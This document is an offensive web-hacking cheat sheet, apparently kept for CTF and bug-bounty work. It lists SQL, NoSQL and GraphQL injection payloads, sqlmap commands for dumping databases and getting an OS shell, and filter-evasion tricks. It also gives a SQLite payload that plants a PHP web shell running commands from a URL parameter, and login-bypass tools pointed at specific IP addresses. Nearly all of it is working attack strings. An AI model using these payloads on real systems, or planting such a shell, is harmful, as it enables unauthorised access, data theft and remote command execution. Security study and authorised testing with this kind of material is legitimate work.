# Detection
### Authentication Bypass
```bash
admin';%00
admin' --
admin'/*
admin' or '1'='1
admin' or '1'='1'--                                     # a space is needed after --
admin' or '1'='1'#
admin' or '1'='1'/*
' or ( 1=1 and username='admin');
{"username":"admin","password": {"password": 1}}        # nodeJS + mysql
```
### Classic SQLi
- Insert `'`, `"`, `\` into every user input and look for errors or other anomalies.
  ```
  '#                       # also replace all ' with "
  '--                      # a space is needed after -- or --+
  '; select 1=1; --
  \'; select 1=1; --       # scape filtering of '
  '+OR+1=1--             
  ```
##### UNION based
- *Default* = *Test1* ≠ *Test2*
  - Default
    ```sql
    page/?id=54
    ```
  - Test1 → One of these payloads has same result with *default* test.
    ```sql
    page/?id=54  order by 1      
    page/?id=54' order by 1#       
    page/?id=54" order by 1#
    ```
  - Test2 → Use the OK payload from *Test1* to run *Test2*.
    ```sql
    page/?id=54  order by 1000
    page/?id=54' order by 1000#
    page/?id=54" order by 1000#
    ```
- Extract data → Firstly find number of columns by changing the number of `order by x`, then define the position of data in page by `union select 1,2,3,...`.
  ```sql
  a' union select 1, database()#
  a' union select 1, group_concat(table_name) from information_schema.tables where table_schema = 'database_name'#
  a' union select 1, group_concat(column_name) from information_schema.columns where table_schema = 'database_name' and table_name = 'table_name'#
  a' union select 1, secret from 'column_name'#
  ```

### Blind SQLi
##### Boolean based
- *Default* = *Test1* ≠ *Test2*
  - Default
    ```sql
    page/?id=54
    ```
  - Test1
    - In string input, for search-boxes, we should fix the query with `%`. (because of using `like '%INPUT%'`) → `test%' and 1=1#` 
    ```sql
    page/?id=54  and 1=1
    page/?id=54' and '1'='1        # ' and 1=1#
    page/?id=54" and "1"="1
    ```
  - Test2
    ```sql
    page/?id=54  and 1=2
    page/?id=54' and '1'='2
    page/?id=54" and "1"="2
    ```
##### Time based
- Check timing difference among these HTTP requests:
  ```sql
  page/?id=54  and sleep(10)
  page/?id=54' and sleep(10)#
  page/?id=54" and sleep(10)#
  ```

# Command Injection via SQLi
- Put this payload in `X-Forwarded-For` header, then open _http://188.166.175.58:32430/lol.php?cmd=ls_
  ```bash
  blahblah','blahblah');ATTACH DATABASE '/www/lol.php' as lol;CREATE TABLE lol.pwn(dataz text); INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
  ```
# NoSQL Injection
### Basic authentication bypass
- In URL
  ```bash
  username[$ne]=toto&password[$ne]=toto
  username[$regex]=.*&password[$regex]=.*
  username[$exists]=true&password[$exists]=true
  ```
- In JSON
  ```bash
  {"username": {"$ne": null}, "password": {"$ne": null} }
  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
  {"username": {"$gt": undefined}, "password": {"$gt": undefined} }
  ```
### User/Pass Enum in MongoDB
- Abuse `[$regex]` with _https://github.com/C4l1b4n/NoSQL-Attack-Suite_.
  - Change the value of `requests_delay` from `1` to `0.01`.
  ```bash
  python3 nosql-login-bypass.py -t http://167.99.85.216:30389/api/login -u username -p password -m POST -c 200 -s admin
  ```

# GraphQL Injection
- Modify mutation
  ```bash
  # Normal request
  {"query":"mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }","variables":{"username":"admin","password":"admin"}}

  # Maliciuos request
  {"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }","variables":{"username":"admin","password":"admin"}}
  ``` 

# SQLMap
- SQLMap can not handle requests that have CSRFToken.
- https://github.com/sqlmapproject/sqlmap/wiki/Usage
  ```bash
  python3 sqlmap.py -r requestFile --technique=B -p [parameter] --level=5 --proxy http://127.0.0.1:8080 --sql-shell

  python3 sqlmap.py -r requestFile --batch --dbs
  python3 sqlmap.py -r requestFile --batch -D level3 --tables
  python3 sqlmap.py -r requestFile --batch -D level3 -T users --dump

  python3 sqlmap.py -r requestFile --batch -p user --tamper=charunicodeescape --dbs -t 10

  --random_agent           # Bypass WAF and IPS
  --tamper=space2dash, hex2char
  --level                  # Also check referrer, cookie
  --risk                   # Also check INSERT, UPDATE
  --form                   # Check all form's input
  --technique=B            # B (Blind Boolean), T (Blind Time-based), E (Error-based), U (Union)
  --sql-shell
  --os-shell
  --os-cmd=ls
  ```

# ghauri
- https://github.com/r0oth3x49/ghauri

# Tips
- In Bug-Bounty we just have time-based.
- Find filtered character (search for two character with Burp Cluster-Bomb)
  ```python
  with open('all-chars.txt', 'w') as f:
     for number in range(0, 127):
        f.write(chr(number) + "\n")
     f.close()
  ```
- `'` and `"` are filtered  →  Use HEX-encoding (only for strings and NOT SQL queries)
  ```sql
  information_schema.columns where table_name = 'people'
  information_schema.columns where table_name = 0x70656F706C65
  ```
- **space** is filtered  →  `/**/`
- `#`  →  `%23` (In GET requests, as browsers doesn't send fragment sign (`#`) to web server)
- Check for non-recursive filters like **oorrder**, **SEselectLECT**, **UNunionION**.
- `HEX` encoding can be used only in strings.

# Resources
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- https://book.hacktricks.xyz/pentesting-web/sql-injection
- https://book.hacktricks.xyz/pentesting-web/nosql-injection
